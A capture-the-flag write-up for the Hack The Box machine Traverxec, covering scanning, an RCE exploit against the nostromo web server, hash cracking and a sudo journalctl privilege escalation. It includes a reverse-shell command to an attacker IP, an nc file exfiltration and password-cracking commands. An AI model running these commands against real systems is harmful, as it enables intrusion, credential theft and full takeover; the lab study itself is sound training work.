## Traverxec

Difficulty: Easy

### User Flag

```
rustscan -a 10.10.10.165 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/93d07edf-72aa-4e12-aa14-e45e59082e11)

<br>

We identify the server as nostromo 1.9.6 in the response header. This is also identified by nmap result.

![nostromo](https://github.com/b1d0ws/OSCP/assets/58514930/77d97a1c-ff74-422d-b045-baf2df492278)

<br>

There is a public RCE exploit related to this server that we can use to get the first shell.

```
python2 CVE-2019-16278.py -t 10.10.10.165 -p 80 -c "nc 10.10.14.11 1234 -e bash"
```

![searchsploit](https://github.com/b1d0ws/OSCP/assets/58514930/260e15d8-1d29-4ded-901b-63038222a172)

![publicExploit](https://github.com/b1d0ws/OSCP/assets/58514930/0de33db7-cab2-4855-b6f4-0cec7635699c)

<br>

We need to privesc to user David. LinPeas show us a file containing a password hash that is crackable with john.

```
john davidHash.txt --wordlist=usr/share/wordlists/rockyou.txt
```

![davidPass](https://github.com/b1d0ws/OSCP/assets/58514930/96ec712d-0455-429f-942f-40c12dee2d2d)

Inside the same directory of this file, there is a configuration one related to the website called nhttpd.conf.  

This is a [feature](https://book.dragonsploit.com/web-application-testing/nostromo) of nostromus, which can host homedirs on the website. Here we find that the directory is public_www.

![nhttpd](https://github.com/b1d0ws/OSCP/assets/58514930/185b05cb-b31c-43ff-9dcd-4383c1ae91db)

<br>

Here is the key of this challenge. Note that the david home directory has only execute permission for "others". This means that we can enter the directory, but can't list the files inside it, since for this we need reading permission.  

Since we know the name of the directory, we can enter it.

![acessingPublicwww](https://github.com/b1d0ws/OSCP/assets/58514930/a8054bff-f6c9-49ef-b808-b94c1a6b06f0)

<br>

To transfer the backup-ssh-identity-files.tgz we can use two methods.  

The first one is accessing via web and entering the password previously found (Nowonly4me) or use nc.  

Unpacking the file, we discover SSH files. Crack the passphrase with john and log in as david.

```
# Transferring File
http://traverxec.htb/~david/protected-file-area/backup-ssh-identity-files.tgz

OR

# Kali
nc -lnvp 1234 > backup.tgz
# Victim
nc 10.10.14.11 1234 < backup-ssh-identity-files.tgz

# Cracking passphrase
ssh2john home/david/.ssh/id_rsa > sshHash
john sshHash --wordlist=/usr/share/wordlists/rockyou.txt
```

![loggingSSH](https://github.com/b1d0ws/OSCP/assets/58514930/c6dcc2c1-8c8b-4505-be7a-c14003159fc2)

### Root Flag

The privesc is really simple. Inside /home/david/bin, there is a script running journalctl as sudo. Reading GTFOBins, we discover that it uses less as default pager, so just summon a shell with it.

```
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
!/bin/sh
```

![journalctl](https://github.com/b1d0ws/OSCP/assets/58514930/85fcc967-0689-43dc-b5ee-b6546f056383)

![privEsc](https://github.com/b1d0ws/OSCP/assets/58514930/d0497110-7a4f-488d-9fb9-88e1fffae462)
